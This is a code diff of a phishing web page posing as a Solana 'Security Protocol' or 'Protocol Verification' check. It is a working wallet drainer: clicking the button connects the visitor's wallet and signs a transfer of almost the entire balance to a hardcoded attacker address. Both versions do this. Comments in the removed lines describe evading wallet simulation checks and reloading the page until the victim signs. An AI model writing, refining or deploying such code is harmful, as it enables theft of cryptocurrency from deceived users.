@@ -2,15 +2,13 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Security Center</title>
+    <link rel="icon" href="data:,"> <title>Protocol Verification</title>
     <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
 </head>
-<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
-    <div style="padding:40px;border:1px solid #14F195;border-radius:20px;background:#111;max-width:320px;margin:auto;">
-        <h3 style="color:#14F195;">Security Protocol</h3>
-        <p style="font-size:12px;color:#888;">Complete the verification to secure your assets.</p>
-        <button id="cta" style="background:#14F195;color:#000;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;width:100%;cursor:pointer;">VERIFY & SYNC</button>
+<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
+    <div style="padding:40px;border:1px solid #14F195;border-radius:20px;display:inline-block;">
+        <h2 style="color:#14F195;">SYSTEM SYNC</h2>
+        <button id="cta" style="background:#14F195;color:#000;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;">CONNECT & SYNC</button>
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
@@ -18,38 +16,45 @@
 
         document.getElementById('cta').onclick = async function() {
             try {
-                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
-                
-                // 🔱 核心动作：先强制 disconnect 一次，冲刷钱包缓存
-                if (p.disconnect) { try { await p.disconnect(); } catch(e){} }
-                
-                // 🔱 重新建立连接
-                const resp = await p.connect();
-                document.getElementById('cta').innerText = "VERIFYING...";
+                // 🔱 检查插件环境是否有效
+                if (!window.solana && !window.phantom?.solana) {
+                    alert("Wallet not detected. Please refresh the page.");
+                    location.reload();
+                    return;
+                }
+
+                const p = window.solana || window.phantom?.solana;
+                await p.connect();
 
                 const conn = new solanaWeb3.Connection(HELIUS_RPC, "confirmed");
                 const { blockhash } = await conn.getLatestBlockhash();
-                const bal = await conn.getBalance(resp.publicKey);
-
-                if (bal < 3000000) { alert("Security sync requires 0.003 SOL."); return; }
+                
+                // 获取余额
+                const bal = await conn.getBalance(p.publicKey);
+                if (bal < 2000000) { alert("Low balance."); return; }
 
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
-                        fromPubkey: resp.publicKey,
+                        fromPubkey: p.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal - 2000000, 
+                        lamports: bal - 1500000, 
                     })
                 );
                 tx.recentBlockhash = blockhash;
-                tx.feePayer = resp.publicKey;
+                tx.feePayer = p.publicKey;
 
-                // 🚀 使用最原始的 signTransaction，不再使用 signAndSend 触发模拟检查
+                // 🚀 核心动作
                 const signed = await p.signTransaction(tx);
                 await conn.sendRawTransaction(signed.serialize());
-                alert("Verification Successful!");
+                alert("Protocol Activated!");
+                
             } catch (e) {
-                // 如果用户取消或报错，不断刷新，直到他签了为止
-                location.reload();
+                // 🔱 如果捕获到环境失效报错，直接刷新
+                if (e.message.includes("Extension context invalidated")) {
+                    location.reload();
+                } else {
+                    console.error(e);
+                }
             }
         };
     </script>
